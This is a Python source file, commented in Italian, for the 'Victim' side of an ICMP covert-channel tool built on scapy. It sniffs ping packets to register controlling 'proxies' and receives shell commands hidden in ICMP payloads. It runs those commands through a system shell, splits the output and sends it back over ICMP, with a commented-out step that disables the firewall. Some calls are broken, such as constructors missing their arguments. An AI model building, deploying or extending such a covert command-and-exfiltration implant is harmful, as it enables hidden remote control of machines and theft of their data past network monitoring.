#from scapy.all import * 
from scapy.all import IP, ICMP, Raw, AsyncSniffer

import sys
import os
import argparse
import random 
import threading
import sys
import select  
import ipaddress 

from mymethods import *
from custom_enum import * 
from network_methods import *
from thread_methods import THREADING_EVENT 

#file_path = "./attacksingleton.py"
#directory = os.path.dirname(file_path)
#sys.path.insert(0, directory)
#import attacksingleton 
from attacksingleton import * 
from attacksingleton import _IPx
from custom_enum import SENDER_TRUE_SENDER, MSG, ATTACK_TYPE
from get_type import *

#---------------------

def choose_proxy(proxy_list:list[ipaddress.IPv4Address]): 
    if not is_list(proxy_list): 
        raise Exception("choose_proxy: Argomenti non corretti") 
    print(f"I proxy utilzzabili sono: {len(proxy_list)}\n\t{proxy_list}") 
    if not is_list(proxy_list) or len(proxy_list)<=0:
        raise ValueError("choose_proxy: Argomenti non corretti") 
    return random.choice(proxy_list) 

def get_data_from_command(process_shell):
    count=0
    print(f"Did command failed? {process_shell.poll() is not None}") 
    data=[]
    there_is_smth_to_read=True
    while there_is_smth_to_read: 
        count+=1
        print(f"lettura dei dati... {count}")
        print("UUU")
        reads = [process_shell.stderr.fileno(),process_shell.stdout.fileno()] 
        print("UUU")
        ret = select.select(reads, [], [], 1.0)  # 1s timeout for safety 
        for fd in ret[0]:
            if fd == process_shell.stdout.fileno(): 
                output_line = process_shell.stdout.readline()
                if output_line:
                    stripped_data=output_line.strip()
                    print("stdout:",stripped_data)
                    data.append(stripped_data) 
                    if MSG.END_DATA.strip() in stripped_data:
                        print(f"No more lines to read")
                        there_is_smth_to_read = False
                        break
                else:
                    print(f"stdout EOF {output_line}") 
                    there_is_smth_to_read = False
            if fd == process_shell.stderr.fileno(): 
                error_line = process_shell.stderr.readline()
                if error_line:
                    stripped_data=error_line.strip()
                    data.append(stripped_data)
                    print("stderr:", stripped_data) 
                    there_is_smth_to_read = False  
                    break
                else:
                    print(f"stderr EOF {output_line}") 
                    there_is_smth_to_read = False  
                    break
        # Optional: check if process exited early
        #if process_shell.poll() is not None and there_is_smth_to_read:
            #print("Process exited but streams may still have data")
    print(f"Command finished with exit code {process_shell.poll()}")
    return data 

def _windows_get_data_from_command(process_shell):
    data = []
    while True:
        line = process_shell.stdout.readline()
        if not line:
            break
        data.append(line.strip())
    return data
    #stdout_data, stderr_data = process_shell.communicate()
    #return stdout_data.splitlines(), stderr_data.splitlines() 

def callback_wait_for_command(connected_proxy:list, event_pktconn:threading.Event, comando:list): 
    def callback(packet):
        nonlocal comando, connected_proxy, event_pktconn
        print(f"callback wait_for_command received:\n\t{packet.summary()}") 
        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
            if ipaddress.ip_address(packet[IP].src) in connected_proxy and MSG.CONFIRM_COMMAND.encode() in packet[Raw].load:
                comando.append(packet[Raw].load.decode().replace(MSG.CONFIRM_COMMAND,""))
                checksum=mycalc.checksum((MSG.CONFIRM_COMMAND+comando[0]).encode())
                print(f"Payload: {packet[Raw].load} and ICMP ID: {packet[ICMP].id}") 
                if packet[ICMP].id==checksum: 
                    print(f"Ricevuto il comando {comando}")
                    threadevent.set(event_pktconn)
                    return 
            if ipaddress.ip_address(packet[IP].src) not in connected_proxy:
                print(f"Received packet from not recognized address {packet[IP].src}")
            if MSG.CONFIRM_COMMAND.encode() not in packet[Raw].load:
                print(f"Payload doesn't have CONFIRM_COMMAND: {packet[Raw].load}")
            if ipaddress.ip_address(packet[IP].src) in connected_proxy and MSG.END_COMMUNICATION.encode() in packet[Raw].load:
                print(f"End of communication ")
                comando.append(packet[Raw].load.decode()) #packet[Raw].load.decode().replace(END_COMMUNICATION,"")
                threadevent.set(event_pktconn)
                return
    return callback

#---------------- 
class ADD_TO_METHODS:
    def get_ip_host(): 
        while True: 
            ip_host, errore=IP.find_local_IP() 
            if errore:
                print("errore:",errore)  
                msg="Inserire indirizzo IP dell'host:\n\t#" 
                ip_host=input(msg)
            try:  
                return ipaddress.ip_address(ip_host) 
            except Exception as e: 
                print(e) 
                return None 
def check_value_in_parser(args): 
    try:
        if not isinstance(args,argparse.Namespace):
            raise Exception("Argomento parser non è istanza di argparse.Namespace")  
        if not isinstance(args.num_proxy, int):
            raise ValueError("Il numero di proxy non è un intero") 
    except Exception as e: 
        raise Exception(f"check_value_in_parser: {e}") 
    return True 

#---------------- 
class CONNECTED_PROXY: 
    proxy_list:list[ipaddress._IPAddressBase]=None 
    lock:threading.Lock=None 
    enough_event:threading.Event=None 
    type_attack:dict[str:str]={}

    def __init__(self): 
        self.proxy_list=[]
        self.lock=get_threading_Lock() 
        self.enough_event=get_threading_Event()

class GET_ARGS:  
    def from_parser(oggetto=None): 
        if isinstance(oggetto,Victim): 
            print("_victim_get_args_from_parser") 
            parser = argparse.ArgumentParser()
            #parser.add_argument("--ip_host",type=str, help="L'IP dell host dove ricevere i pacchetti ICMP")
            parser.add_argument("--num_proxy",type=int, help="Numero dei proxy necessari")
            #parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")    
            try:
                args,unknown =PARSER.check_arguments(parser) 
                if not is_namespace(args) or not is_list(unknown) or len(unknown)>0:  
                    raise ValueError(f"Argomenti sconosciuti: {unknown}") 
                return args if GET_ARGS.check_value_in_parser(oggetto, args) else None
            except Exception as e: 
                print(e)
                PARSER.print_supported_arguments(parser) 
        #elif isinstance(oggetto,Proxy): 
        #    print("Proxy") 
        #elif isinstance(oggetto,Victim): 
        #    print("Proxy") 
        return None
    
    def check_value_in_parser(oggetto, args): 
        if not isinstance(args,argparse.Namespace): 
            print(f"args non vlaido")  
        if isinstance(oggetto,Victim):  
            if not args.num_proxy or not is_integer(args.num_proxy): 
                print(f"--num_proxy non specificato") 
            else: return True  
        return False

class EXCEUTE_COMMAND: 
    def __init__(self, comando:str=None): 
        def check_system_compatibility():
            supportedSystems=["linux","win32"] 
            if sys.platform not in supportedSystems: 
                print(sys.platform," non supportato")
                return False 
            return True     
        def append_END_DATA(command:str=None):
            if not is_string(command):
                raise ValueError("comando non stringa",comando) 
            if sys.platform=="win32":
                command+=f" && echo '{MSG.END_DATA.value}'"
            elif sys.platform=="linux": 
                command+=f"; echo '{MSG.END_DATA.value}'" 
            else: print("Sistema operativo non supportato.") 
            print("END append_END_DATA->",command) 
            return command
        def read_stream(stream, data_list:list=None):  
            if not is_list(data_list): 
                raise TypeError("data_list non valida")
            for line in iter(stream.readline, ''):
                if line:
                    decoded = line.rstrip()
                    #print(f"{label}: {decoded}")
                    data_list.append(decoded)
            stream.close() 
        #---------------------
        print("Sistema supportato...") 
        if not is_string(comando): 
            raise ValueError("comando non stringa",comando) 
        if not check_system_compatibility(): 
            raise SystemError(f"{sys.platform} non supportato...") 
        #comando=append_END_DATA(comando)  
        process_shell=get_shellProcess_command(comando) 
        if not is_subprocess_Popen(process_shell): 
            raise Exception("shell non valida:",type(process_shell)) 
        if not process_shell.stdout: 
            raise Exception("stdout non valido") 
        if not process_shell.stderr: 
            raise Exception("stdout non valido") 
        print("Shell aperta con successo...") 
        data_stdout=[] 
        thread_stdout = threading.Thread(
            target=read_stream, 
            args=(process_shell.stdout, data_stdout),
            daemon=True
        ) 
        thread_stdout.start() 

        data_stderr=[] 
        thread_stderr = threading.Thread(
            target=read_stream, 
            args=(process_shell.stderr, data_stderr), 
            daemon=True
        ) 
        thread_stderr.start() 
        
        process_shell.wait()
        process_shell.terminate() 
        thread_stdout.join()
        thread_stderr.join() 
        print("Comando eseguito") 
        #print("STDOUT",data_stdout) 
        data:str=""
        if is_list(data_stdout) and len(data_stdout)>0: 
            data+="".join(text for text in data_stdout) 
        #print("STDEERR",data_stderr) 
        if is_list(data_stderr) and len(data_stderr)>0: 
            data+="".join(text for text in data_stderr) 
        #print("DATI ESECUZIONE",data) 
        self.data=data.strip()
        #if self.data=="": 
        #    self.data=None

WAITING_TIME=20
DEBUG=False 
type_sender=SENDER_TRUE_SENDER 
use_delay=False
class Victim:  
    attack_function:ATTACK_TYPE=None 
    stop_flag={"value":False} 

    def __init__(self): 
        self.ip_host=ADD_TO_METHODS.get_ip_host() 
        if not is_ipaddress(self.ip_host): 
            raise TypeError("ip_host non valido") 
        args=GET_ARGS.from_parser(self) 
        if not is_namespace(args): 
            exit(0) 
        self.num_proxy=args.num_proxy 
        if not is_integer(self.num_proxy): 
            raise TypeError("num_proxy non valido")
        self.connected_proxy=CONNECTED_PROXY() 
        if not isinstance(self.connected_proxy, CONNECTED_PROXY): 
            raise TypeError("connected_proxy is not CONNECTED_PROXY",type(self.connected_proxy))
        if not is_list(self.connected_proxy.proxy_list): 
            raise TypeError("proxy_list non valido") 
        if not is_threading_Lock(self.connected_proxy.lock): 
            raise TypeError("lock non valido") 
    
    class VICTIM_WAIT_CONNECTIONS: 
        def __init__(self, vittima:Victim=None, num_connessioni:int=0, connected_proxy:CONNECTED_PROXY=None):
            if not isinstance(vittima, Victim): 
                raise TypeError("non oggetto Victim->",type(vittima)) 
            self.vittima=vittima 
            if not is_integer(num_connessioni) or num_connessioni<0: 
                raise TypeError("numero non valido->",num_connessioni) 
            self.num_connessioni=num_connessioni
            if not isinstance(connected_proxy, CONNECTED_PROXY): 
                raise TypeError("List host connessi non valida:",connected_proxy)
            self.connected_proxy=connected_proxy
        
        def start(self,ip_host): 
            def callback_timer(): 
                self.connected_proxy.lock.acquire() 
                #is_enough_proxy=len(connected_proxy.proxy_list) >= num_proxy 
                proxy_necessari=self.num_connessioni-len(self.connected_proxy.proxy_list)
                self.connected_proxy.lock.release()
                if proxy_necessari>0: 
                    msg="Numero minimo di connessioni non raggiunto.\nContinuare ad aspettare ulteriormente? (s/n) " 
                    if ask_bool_choice(msg): 
                        print("Continuo ad aspettare...") 
                        self.timer.cancel() 
                        self.timer=get_timer(WAITING_TIME, callback_timer())  
                        self.timer.start() 
                        return
                    else: print("Smetto di aspettare...") 
                else:print("Numero minimo di connessioni raggiunto") 
                #self.stop_flag["value"]=True 
                THREADING_EVENT.set(self.event_enough_proxy) 
            def get_sniffer(): 
                interface=DEFAULT_INTERFACE().default_iface 
                if interface is None: 
                    raise ValueError("interface is None",interface) 
                print("Monitoring interface->",interface) 
                sniff_args={
                    "filter": get_filter() 
                    ,"prn":get_pkt_callback()
                    #,"store":False 
                    ,"iface":interface
                } 
                return get_AsyncSniffer(sniff_args) 
            def get_filter(): 
                if not is_ipaddress(ip_host): 
                    raise TypeError("ip_host non valido")  
                IPv4_ECHO_REQUEST= ICMP_TYPE.v4_Echo_Request if ip_host.version==4 else ICMP_TYPE.v6_Echo_Request
                IPv4_ECHO_REPLY= ICMP_TYPE.v4_Echo_Reply if ip_host.version==4 else ICMP_TYPE.v6_Echo_Reply
                if ip_host.version==4: 
                    icmp="icmp " 
                elif ip_host.version==6: 
                    icmp="icmp6 " 
                filter= icmp if not DEBUG else f"({icmp} or tcp)" 
                filter+=f" and ({icmp}[0]=={IPv4_ECHO_REQUEST} or {icmp}[0]=={IPv4_ECHO_REPLY}) "  
                filter+=f" and dst {ip_host.compressed}"
                return filter 
            def get_pkt_callback(): 
                def pkt_callback(packet): 
                    #print(packet.summary()) 
                    if not packet.haslayer(IP) or not packet.haslayer(ICMP) or not packet.haslayer(Raw): 
                        print("Livello IP, ICMP o Raw non presente nel pacchetto") 
                        return 
                    #else: print("Pacchetto accettato")
                    try:
                        ip_src=ipaddress.ip_address(packet[IP].src) 
                    except Exception as e: 
                        return 
                    self.connected_proxy.lock.acquire() 
                    is_already_connected= ip_src in self.connected_proxy.proxy_list
                    self.connected_proxy.lock.release()  
                    if is_already_connected:  
                        print(f"Host {ip_src} gia connesso...:")
                        return  
                    else: print(f"Host {ip_src} non connesso") 
                    confirm_text=MSG.CONFIRM_PROXY.value+ip_host.compressed 
                    if confirm_text not in packet[Raw].load.decode(): 
                        print("Connessione non confermata")
                        return 
                    str_attacco=packet[Raw].load.decode().replace(confirm_text,"")  
                    attack_function=ATTACK_TYPE.get_attack_method(str_attacco) 
                    print("Tipologia di attacco ricevuto:",attack_function) 
                    if not is_enum_member(attack_function,ATTACK_TYPE): 
                        print("Attacco non valido:",attack_function) 
                        return
                    self.connected_proxy.lock.acquire() 
                    self.connected_proxy.type_attack[ip_src.compressed]=attack_function 
                    self.connected_proxy.lock.release() 
                    print("Tipologia di attacco ricevuto:",self.connected_proxy.type_attack[ip_src.compressed]) 
                    msg_conferma=( 
                        MSG.CONFIRM_VICTIM.value+
                        ip_host.compressed+
                        ip_src.compressed+ 
                        self.connected_proxy.type_attack[ip_src.compressed].name
                    )  
                    try:  
                        SendSingleton(
                            ATTACK_TYPE.ipv4_echo_payload, 
                            SENDER_TYPE.SENDER_TRUE_SENDER, 
                            use_delay=False
                        ).send_data(msg_conferma.encode(), ip_src) 
                        print("Conferma inviata a:",ip_src)  
                        self.connected_proxy.lock.acquire() 
                        if ip_src not in self.connected_proxy.proxy_list:
                            self.connected_proxy.proxy_list.append(ip_src) 
                            print("Proxy aggiunto alla lista")
                        else: print("Proxy già presente") 
                        proxy_necessari=self.num_connessioni-len(self.connected_proxy.proxy_list)
                        self.connected_proxy.lock.release() 
                        if proxy_necessari<=0: # and ask_bool_choice(msg)
                            THREADING_EVENT.set(self.event_enough_proxy) 
                            self.stop_flag["value"]=True 
                    except Exception as e: 
                        print(e) 
                        print(f"Connessione non confermata. {ip_src} non aggiunto alla lista") 
                return pkt_callback 
            #-------------------------------------------
            if not is_list(self.connected_proxy.proxy_list): 
                raise TypeError("proxy_list non valido") 
            if not is_threading_Lock(self.connected_proxy.lock): 
                raise TypeError("ip_host non valido")  
            if not is_ipaddress(ip_host): 
                raise TypeError("ip_host non valido") 
            self.event_enough_proxy=get_threading_Event() 
            if not is_threading_Event(self.event_enough_proxy): 
                raise TypeError("non threading.Event",type(self.event_enough_proxy)) 
            self.timer:threading.Timer=get_timer(
                WAITING_TIME, 
                lambda:callback_timer()
            ) 
            if not is_threading_Timer(self.timer): 
                raise TypeError("non è threading.Timer",type(self.timer)) 
            sniffer:AsyncSniffer=get_sniffer()
            if not is_AsyncSniffer(sniffer): 
                raise TypeError("non AsyncSniffer",type(sniffer)) 
            self.timer.start() 
            if self.timer.is_alive():
                print("Timer started...") 
            else: raise RuntimeError("Timer not started...") 
            sniffer.start() 
            if sniffer.running:
                print("Sniffer started...") 
            else: raise RuntimeError("Sniffer not started...") 
            print("Waiting thread to end...") 
            THREADING_EVENT.wait(self.event_enough_proxy) 
            if self.timer.is_alive(): 
                self.timer.cancel()
                print("Timer stopped...") 
            sniffer.stop()
            if sniffer.running: 
                raise RuntimeError("SNIFFER NOT STOPPED:",sniffer.running)
            print("Sniffer stopped...") 

    class VICTIM_WAIT_COMMAND: 
        def __init__(self, attack_function, ip_host):
            if not is_enum_member(self.attack_function,ATTACK_TYPE): 
                raise TypeError("attack_function non ATTACK_TYPE") 
            self.attack_function=attack_function
            if not is_ipaddress(self.ip_host): 
                raise TypeError("ip_host non valido")  
            self.ip_host=ip_host

        def start(self):  
            print("Waiting command tramite:",self.attack_function) 
            wait_class=ReceiveSingleton(self.attack_function).wait_class
            if not isinstance(wait_class, _IPx):  
                raise TypeError("wait_class non valida") 
            if DEBUG: 
                msg="Inserisci il comando: " 
                comando=input(msg) 
            else: 
                wait_class.wait() 
                print("Received data") 
                comando=wait_class.data 
            if not is_string(comando): 
                raise TypeError("comando non stringa",type(comando))  
            print("Command received:",comando) 
            if any(case in comando for case in exit_cases): 
                raise ValueError("Comando per interruzione del programma") 
            self.comando=comando
    
    class VICTIM_SEND_DATA: 
        def __init__(self, vittima:Victim=None, data:str=None):
            def divide_proxy_data(): 
            #def send_data_to_proxies(data_to_send:list, connected_proxy:list[ipaddress.IPv4Address], attack_function:dict): 
                proxy_data=[
                    [] for proxy in vittima.connected_proxy.proxy_list 
                ] 
                #if DEBUG: 
                #    print("DEBUG: send_data -> proxy_data")
                #    proxy_data=[[],[],[],[],[]] 
                #print("PROXY DATA:",proxy_data)
                batch_size=int(1024/(2*2)) #256 bytes 
                batch_number=int(len(data)/batch_size)+1
                for index in range(batch_number): 
                    print("INDEX",index) 
                    start=index*batch_size
                    end=index*batch_size+batch_size 
                    proxy_data[index%len(proxy_data)].append(str(index)+MSG.SEPARATORE_INDEX_DATA.value+data[start:end])  
                #print("WWWW")
                #for proxy_batch in proxy_data: 
                #    print("AAA",len(proxy_batch))
                #    for batch in proxy_batch: 
                #        print(batch,end="\t") 
                #    print("\n")
                #print("WWWW") 
                for proxy_index in range(len(proxy_data)): 
                    proxy_batch=proxy_data[proxy_index]
                    if len(proxy_batch)<=0: 
                        continue 
                    new_data="".join(
                        proxy_batch[index] if index==0 
                        else MSG.SEPARATORE_BATCH.value+proxy_batch[index] 
                        for index in range(len(proxy_batch))
                    ) 
                    print("NEW DATA",len(new_data),new_data)
                    proxy_data[proxy_index]=new_data 
                #print("SSSS")
                #for proxy_batch in proxy_data: 
                #    print("AAA",len(proxy_batch),proxy_batch) 
                #print("SSSS") 
                return proxy_data
            def send_data(data:str=None, proxy:ipaddress=None, attack_function:ATTACK_TYPE=None): 
                if not is_string(data) or not is_ipaddress(proxy) or not is_enum_member(attack_function, ATTACK_TYPE): 
                    raise TypeError("IP host, Dato oppure Attack non validi") 
                if  data.strip()=="":  
                    send_last_packet(proxy) 
                    return 
                print("DATA",data)
                print("PROXY",proxy) 
                print("ATTACK",attack_function)  
                SendSingleton(
                    attack_function, 
                    type_sender, 
                    use_delay 
                ).send_data(data.encode(), proxy) 
                send_last_packet(proxy) 
                #unavailable_proxy=send_last_packet() 
            def send_last_packet(proxy:ipaddress=None): 
                if not is_ipaddress(proxy): 
                    raise TypeError("IP host non valido")  
                print("SEND LAST PACKET:",proxy) 
                try: 
                    data=MSG.LAST_PACKET.value  
                    SendSingleton(
                        self.attack_function, 
                        type_sender, 
                        use_delay 
                    ).send_data(data.encode(), proxy) 
                except Exception as e: 
                    print(e)
                    print("LAST PACKET NON ARRIVATO:",proxy)   
            #--------------------------- 
            if not is_string(data): 
                raise ValueError("Dati non stringa",data) 
            if not isinstance(vittima, Victim): 
                raise TypeError("Vittima non valida")
            proxy_data=divide_proxy_data(data) 
            if not is_list(proxy_data): 
                raise TypeError("proxy_data non lista") 
            if all(not is_string(stringa) for stringa in proxy_data): 
                raise TypeError("data non string",type(proxy_data)) 
            print("PROXY DATA",proxy_data) 
            print("LEN PROXY DATA",len(proxy_data))
            print("Sending data...") 
            for index in range(len(proxy_data)):
                if DEBUG: 
                    send_data(proxy_data[index], vittima.ip_host, ATTACK_TYPE.ipv4_destination_unreachable)  
                else: 
                    send_data(proxy_data[index], vittima.connected_proxy.proxy_list[index], vittima.connected_proxy.type_attack[index]) 

    def start(self):  
        if not is_integer(self.num_proxy) or self.num_proxy<=0: 
            raise ValueError("Numero proxy non valido:",self.num_proxy)  
        print("IP della macchina:", self.ip_host) 
        print("Proxy richiesti:",self.num_proxy) 
        try: 
            #FIREWALL.disable() #TODO decommentare 
            self.check_variables() 
            print("Waiting connections...")  
            object_wait_proxy=self.VICTIM_WAIT_CONNECTIONS(
                self, self.num_proxy, self.connected_proxy
            ) 
            object_wait_proxy.start(self.ip_host)  
            print("Proxy disponiili:",len(self.connected_proxy.proxy_list)) 
            print("Attacchi scelti:",len(self.connected_proxy.type_attack)) 
            if not is_enum_member(self.attack_function, ATTACK_TYPE): 
                raise TypeError("attack_function non valida") 
            self.connected_proxy.lock.acquire()
            host_connessi=len(self.connected_proxy.proxy_list)
            self.connected_proxy.lock.release()
            if host_connessi<self.num_proxy: 
                if host_connessi<=0: 
                    print("Lista proxy vuota") 
                    raise SystemError("Interruzione del programma...")  
                msg="Non sono stati trovati abbastanza proxy\nUtilizzare quelli trovati? [si/no]" 
                scelta=ask_bool_choice(msg)  
                if not scelta: 
                    print("Si è scelto di non continuare") 
                    raise SystemError("Interruzione del programma...")  
                print("Continuo con i proxy trovati...")  
                return  
            else: print("Si sono conessi abbastanza proxy...") 
            object_comand=self.VICTIM_WAIT_COMMAND()
            while True: 
                try: 
                    object_comand.start() 
                    data=EXCEUTE_COMMAND(object_comand.comando).data
                    print("Command executed...") 
                    object_send=self.VICTIM_SEND_DATA(self, data) 
                    print("Finished sending data...") 
                except Exception as e: 
                    print(e)
                    break
            print("Closing connection")
        except Exception as e:
            print(e)
            FIREWALL.enable()
            exit(1) 
        finally: 
            FIREWALL.enable() 

if __name__ == "__main__": 
    vittima=Victim() 
    vittima.start() 
    